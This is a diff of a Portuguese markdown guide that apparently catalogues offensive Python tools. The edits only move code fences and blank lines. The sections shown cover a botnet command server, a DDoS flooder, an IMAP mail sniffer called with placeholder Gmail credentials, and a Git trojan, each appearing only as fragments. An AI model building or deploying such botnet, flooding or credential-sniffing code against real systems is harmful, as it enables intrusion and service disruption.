@@ -143,13 +143,14 @@ def create_botnet_server(host, port):
             # Enviar comandos para o cliente
             conn.sendall(b'Command executed')
         conn.close()
+```
 
 # Exemplo de uso
 create_botnet_server('127.0.0.1', 12345)
-  ```
-  
+
 * **DDoS:**
   * **socket:** Enviar múltiplas requisições.
+
    ```
 import socket
 import threading
@@ -175,6 +176,7 @@ if __name__ == '__main__':
    
 * **Mail Sniffer:**
   * **imaplib:** Interagir com servidores IMAP.
+
  ```
 import imaplib
 
@@ -200,6 +202,7 @@ check_mailbox('imap.gmail.com', 'seu_email@gmail.com', 'sua_senha')
   
 * **Git Trojan:**
   * **gitpython:** Manipular repositórios Git.
+
 ```
 import git
 
